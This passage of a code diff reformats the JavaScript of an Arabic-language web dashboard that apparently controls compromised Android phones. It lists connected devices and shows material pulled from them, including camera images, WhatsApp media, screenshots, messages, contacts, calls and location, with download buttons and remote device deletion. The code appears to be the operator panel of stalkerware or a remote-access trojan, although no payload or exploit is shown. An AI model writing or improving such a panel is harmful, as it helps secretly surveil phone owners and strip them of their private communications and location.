+        : b > 20
+            ? "var(--blue)"
+            : "var(--red)";
+
+
+/* =========================================================
+   STATE
+   ========================================================= */
 
 let devices = [];
+
 let selectedId = null;
-let currentSection = "overview";
+
+let currentSection =
+    "overview";
+
+
+/* =========================================================
+   FETCH DEVICES
+   ========================================================= */
 
 async function fetchDevices() {
-  try {
-    const res = await fetch("/api/devices", { headers: { Authorization: "Bearer " + tk } });
-    if (res.status === 401) { sessionStorage.clear(); location.href = "/login.html"; return; }
-    const data = await res.json();
-    devices = data.devices || [];
-    renderDeviceList();
-    if (selectedId) renderContent();
-  } catch (e) { console.error(e); }
+
+    try {
+
+        const res =
+            await fetch(
+                "/api/devices",
+                {
+                    headers: {
+                        Authorization:
+                            "Bearer " + tk
+                    }
+                }
+            );
+
+
+        if (res.status === 401) {
+
+            sessionStorage.clear();
+
+            location.href =
+                "/login.html";
+
+            return;
+        }
+
+
+        const data =
+            await res.json();
+
+
+        devices =
+            data.devices || [];
+
+
+        renderDeviceList();
+
+
+        if (selectedId) {
+
+            renderContent();
+        }
+
+
+    } catch (e) {
+
+        console.error(e);
+    }
 }
+
+
+/* =========================================================
+   DEVICE LIST
+   ========================================================= */
 
 function renderDeviceList() {
-  const el = document.getElementById("dev-list");
-  if (!devices.length) { el.innerHTML = '<div class="empty">لا توجد أجهزة متصلة</div>'; return; }
-  el.innerHTML = devices.map(d => `
-    <div class="device-item ${d.id === selectedId ? 'active' : ''}" data-id="${esc(d.id)}">
-      <div class="dot ${d.status}"></div>
-      <div>
-        <div class="dev-name">${esc(d.id)}</div>
-        <div class="dev-meta">${esc(d.model || "غير معروف")}</div>
-      </div>
-    </div>
-  `).join("");
-  
-  el.querySelectorAll(".device-item").forEach(div => {
-    div.onclick = () => { selectedId = div.dataset.id; renderDeviceList(); renderContent(); };
-  });
+
+    const el =
+        document.getElementById(
+            "dev-list"
+        );
+
+
+    if (!devices.length) {
+
+        el.innerHTML =
+            '<div class="empty">لا توجد أجهزة متصلة</div>';
+
+        return;
+    }
+
+
+    el.innerHTML =
+        devices.map(d => `
+
+            <div
+                class="device-item ${d.id === selectedId ? "active" : ""}"
+                data-id="${esc(d.id)}"
+            >
+
+                <div
+                    class="dot ${d.status}"
+                ></div>
+
+                <div>
+
+                    <div class="dev-name">
+                        ${esc(d.id)}
+                    </div>
+
+                    <div class="dev-meta">
+                        ${esc(d.model || "غير معروف")}
+                    </div>
+
+                </div>
+
+            </div>
+
+        `).join("");
+
+
+    el.querySelectorAll(
+        ".device-item"
+    ).forEach(div => {
+
+        div.onclick = () => {
+
+            selectedId =
+                div.dataset.id;
+
+            renderDeviceList();
+
+            renderContent();
+        };
+
+    });
 }
+
+
+/* =========================================================
+   RENDER CONTENT
+   ========================================================= */
 
 async function renderContent() {
-  const dev = devices.find(d => d.id === selectedId);
-  const viewerTitle = document.getElementById("viewer-title");
-  const container = document.getElementById("viewer-content");
 
-  if (!dev) { 
-    viewerTitle.textContent = "اختر جهازاً وقسماً لعرض المحتوى";
-    container.innerHTML = '<div class="empty">الرجاء تحديد جهاز أولاً.</div>'; 
-    return; 
-  }
+    const dev =
+        devices.find(
+            d => d.id === selectedId
+        );
 
-  viewerTitle.textContent = `جهاز: ${esc(dev.id)} // قسم: ${currentSection}`;
 
-  if (currentSection === "overview") {
-    container.innerHTML = `
-      <table>
-        <tr><th>المعلومة التقنية</th><th>القيمة من الجهاز</th></tr>
-        <tr><td>معرف الجهاز (ID)</td><td>${esc(dev.id)}</td></tr>
-        <tr><td>حالة الاتصال</td><td><span class="badge ${dev.status}">${esc(dev.status)}</span></td></tr>
-        <tr><td>الطراز (Model)</td><td>${esc(dev.model || "—")}</td></tr>
-        <tr><td>إصدار الأندرويد</td><td>${esc(dev.osVersion || "—")}</td></tr>
-        <tr><td>نسبة البطارية</td><td><b style="color:${battColor(dev.battery)}">${dev.battery}%</b></td></tr>
-      </table>`;
-    return;
-  }
+    const viewerTitle =
+        document.getElementById(
+            "viewer-title"
+        );
 
-  try {
-    container.innerHTML = '<div class="empty" style="color: var(--neon-yellow);">جاري سحب المحتوى من السيرفر...</div>';
-    const res = await fetch("/api/diagnostics/" + encodeURIComponent(selectedId), { headers: { Authorization: "Bearer " + tk } });
-    const data = await res.json();
-    const diag = data.diagnostics?.[currentSection];
-    
-    if (!diag || !diag.items?.length) {
-      container.innerHTML = `<div class="empty">لا توجد بيانات متاحة في قسم (${currentSection}) لهذا الجهاز.<br><small style="color:var(--neon-purple);">تحقق من الأذونات واستقرار الاتصال.</small></div>`;
-      return;
+
+    const container =
+        document.getElementById(
+            "viewer-content"
+        );
+
+
+    if (!dev) {
+
+        viewerTitle.textContent =
+            "اختر جهازاً وقسماً لعرض المحتوى";
+
+        container.innerHTML =
+            '<div class="empty">الرجاء تحديد جهاز أولاً.</div>';
+
+        return;
     }
-    
-    // إذا كان القسم عبارة عن صور (كاميرا، واتساب، لقطات شاشة) مع إمكانية التحميل
-    if (["camera", "whatsapp", "screenshots"].includes(currentSection)) {
-      container.innerHTML = `
-        <div class="media-grid">
-          ${diag.items.map(img => `
-            <div class="media-box">
-              <img src="${esc(img)}" alt="Media" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'100\'><rect width=\'100\' height=\'100\' fill=\'%23111\'/><text x=\'50%\' y=\'50%\' fill=\'%23666\' dominant-baseline=\'middle\' text-anchor=\'middle\' font-size=\'11\'>صورة</text></svg>'">
-              <a href="${esc(img)}" target="_blank" download class="download-btn">📥 تحميل</a>
-            </div>`).join("")}
-        </div>`;
-    } else {
-      // للرسائل، جهات الاتصال، المكالمات، والموقع
-      container.innerHTML = `
-        <table>
-          <tr><th>#</th><th>محتوى البيانات المسحوبة</th><th>الحالة</th></tr>
-          ${diag.items.map((item, i) => `<tr><td>${i+1}</td><td>${esc(item)}</td><td><span style="color:var(--neon-green)">متزامن</span></td></tr>`).join("")}
-        </table>`;
+
+
+    viewerTitle.textContent =
+        `جهاز: ${esc(dev.id)} // قسم: ${currentSection}`;
+
+
+    /* =====================================================
+       OVERVIEW
+       ===================================================== */
+
+    if (
+        currentSection ===
+        "overview"
+    ) {
+
+        container.innerHTML = `
+
+            <table>
+
+                <tr>
+                    <th>المعلومة التقنية</th>
+                    <th>القيمة من الجهاز</th>
+                </tr>
+
+                <tr>
+                    <td>معرف الجهاز (ID)</td>
+                    <td>${esc(dev.id)}</td>
+                </tr>
+
+                <tr>
+                    <td>حالة الاتصال</td>
+
+                    <td>
+                        <span
+                            class="badge ${dev.status}"
+                        >
+                            ${esc(dev.status)}
+                        </span>
+                    </td>
+
+                </tr>
+
+                <tr>
+                    <td>الطراز (Model)</td>
+                    <td>${esc(dev.model || "—")}</td>
+                </tr>
+
+                <tr>
+                    <td>إصدار الأندرويد</td>
+                    <td>${esc(dev.osVersion || "—")}</td>
+                </tr>
+
+                <tr>
+
+                    <td>نسبة البطارية</td>
+
+                    <td>
+
+                        <b
+                            style="
+                                color:${battColor(dev.battery)};
+                                text-shadow:
+                                0 0 8px currentColor;
+                            "
+                        >
+                            ${dev.battery}%
+                        </b>
+
+                    </td>
+
+                </tr>
+
+            </table>
+
+        `;
+
+        return;
     }
-  } catch (e) {
-    container.innerHTML = '<div class="empty" style="color: var(--neon-red);">فشل جلب بيانات القسم من الخادم</div>';
-  }
+
+
+    /* =====================================================
+       DIAGNOSTICS
+       ===================================================== */
+
+    try {
+
+        container.innerHTML =
+            '<div class="empty" style="color:var(--blue)">جاري سحب المحتوى من السيرفر...</div>';
+
+
+        const res =
+            await fetch(
+                "/api/diagnostics/" +
+                encodeURIComponent(
+                    selectedId
+                ),
+                {
+                    headers: {
+                        Authorization:
+                            "Bearer " + tk
+                    }
+                }
+            );
+
+
+        const data =
+            await res.json();
+
+
+        const diag =
+            data.diagnostics?.[
+                currentSection
+            ];
+
+
+        if (
+            !diag ||
+            !diag.items?.length
+        ) {
+
+            container.innerHTML = `
+
+                <div class="empty">
+
+                    لا توجد بيانات متاحة في قسم (${currentSection}) لهذا الجهاز.
+
+                    <small
+                        style="
+                            color:var(--blue);
+                            display:block;
+                        "
+                    >
+                        تحقق من الأذونات واستقرار الاتصال.
+                    </small>
+
+                </div>
+
+            `;
+
+            return;
+        }
+
+
+        /* =================================================
+           MEDIA
+           ================================================= */
+
+        if (
+            [
+                "camera",
+                "whatsapp",
+                "screenshots"
+            ].includes(
+                currentSection
+            )
+        ) {
+
+            container.innerHTML = `
+
+                <div class="media-grid">
+
+                    ${diag.items.map(
+                        img => `
+
+                        <div class="media-box">
+
+                            <img
+                                src="${esc(img)}"
+                                alt="Media"
+                                onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\\'http://www.w3.org/2000/svg\\' width=\\'100\\' height=\\'100\\'><rect width=\\'100\\' height=\\'100\\' fill=\\'%2306090b\\'/><text x=\\'50%\\' y=\\'50%\\' fill=\\'%23465650\\' dominant-baseline=\\'middle\\' text-anchor=\\'middle\\' font-size=\\'11\\'>صورة</text></svg>'"
+                            >
+
+                            <a
+                                href="${esc(img)}"
+                                target="_blank"
+                                download
+                                class="download-btn"
+                            >
+                                📥 تحميل
+                            </a>
+
+                        </div>
+
+                    `).join("")}
+
+                </div>
+
+            `;
+
+        } else {
+
+            /* =============================================
+               DATA TABLE
+               ============================================= */
+
+            container.innerHTML = `
+
+                <table>
+
+                    <tr>
+
+                        <th>#</th>
+
+                        <th>
+                            محتوى البيانات المسحوبة
+                        </th>
+
+                        <th>
+                            الحالة
+                        </th>
+
+                    </tr>
+
+                    ${diag.items.map(
+                        (item, i) => `
+
+                        <tr>
+
+                            <td>
+                                ${i + 1}
+                            </td>
+
+                            <td>
+                                ${esc(item)}
+                            </td>
+
+                            <td>
+
+                                <span
+                                    style="
+                                        color:var(--green);
+                                        text-shadow:
+                                        0 0 7px
+                                        rgba(0,255,136,.35);
+                                    "
+                                >
+                                    متزامن
+                                </span>
+
+                            </td>
+
+                        </tr>
+
+                    `).join("")}
+
+                </table>
+
+            `;
+        }
+
+
+    } catch (e) {
+
+        console.error(e);
+
+        container.innerHTML =
+            '<div class="empty" style="color:var(--red)">فشل جلب بيانات القسم من الخادم</div>';
+    }
 }
 
-// التحكم بأزرار القائمة الفرعية لأقسام الجهاز
-document.querySelectorAll(".sub-menu-item").forEach(item => {
-  item.onclick = () => {
-    document.querySelectorAll(".sub-menu-item").forEach(i => i.classList.remove("active"));
-    item.classList.add("active");
-    currentSection = item.dataset.section;
-    renderContent();
-  };
-});
 
-// وظيفة حذف الجهاز
-async function deleteDevice() {
-  if (!selectedId) { alert("اختر جهازاً أولاً لحذفه."); return; }
-  if (!confirm(`هل أنت متأكد من حذف الجهاز (${selectedId}) نهائياً؟`)) return;
-  
-  try {
-    const res = await fetch("/api/devices/" + encodeURIComponent(selectedId), { 
-      method: "DELETE", 
-      headers: { Authorization: "Bearer " + tk } 
+/* =========================================================
+   SECTION MENU
+   ========================================================= */
+
+document
+    .querySelectorAll(
+        ".sub-menu-item"
+    )
+    .forEach(item => {
+
+        item.onclick = () => {
+
+            document
+                .querySelectorAll(
+                    ".sub-menu-item"
+                )
+                .forEach(i =>
+                    i.classList.remove(
+                        "active"
+                    )
+                );
+
+
+            item.classList.add(
+                "active"
+            );
+
+
+            currentSection =
+                item.dataset.section;
+
+
+            renderContent();
+        };
+
     });
-    if (res.ok) {
-      selectedId = null;
-      fetchDevices();
-      document.getElementById("viewer-content").innerHTML = '<div class="empty">تم حذف الجهاز بنجاح.</div>';
-    } else {
-      alert("فشل الحذف من السيرفر.");
+
+
+/* =========================================================
+   DELETE DEVICE
+   ========================================================= */
+
+async function deleteDevice() {
+
+    if (!selectedId) {
+
+        alert(
+            "اختر جهازاً أولاً لحذفه."
+        );
+
+        return;
     }
-  } catch (e) { alert("خطأ في الاتصال."); }
+
+
+    if (
+        !confirm(
+            `هل أنت متأكد من حذف الجهاز (${selectedId}) نهائياً؟`
+        )
+    ) {
+
+        return;
+    }
+
+
+    try {
+
+        const res =
+            await fetch(
+                "/api/devices/" +
+                encodeURIComponent(
+                    selectedId
+                ),
+                {
+                    method:
+                        "DELETE",
+
+                    headers: {
+                        Authorization:
+                            "Bearer " + tk
+                    }
+                }
+            );
+
+
+        if (res.ok) {
+
+            selectedId =
+                null;
+
+            fetchDevices();
+
+
+            document
+                .getElementById(
+                    "viewer-content"
+                )
+                .innerHTML =
+                '<div class="empty">تم حذف الجهاز بنجاح.</div>';
+
+        } else {
+
+            alert(
+                "فشل الحذف من السيرفر."
+            );
+        }
+
+
+    } catch (e) {
+
+        alert(
+            "خطأ في الاتصال."
+        );
+    }
 }
 
-setInterval(fetchDevices, 5000);
+
+/* =========================================================
+   AUTO REFRESH
+   ========================================================= */
+
+setInterval(
+    fetchDevices,
+    5000
+);
+
+
+/* =========================================================
+   INITIAL LOAD
+   ========================================================= */
+
 fetchDevices();
+
 </script>
+
 </body>
 </html>
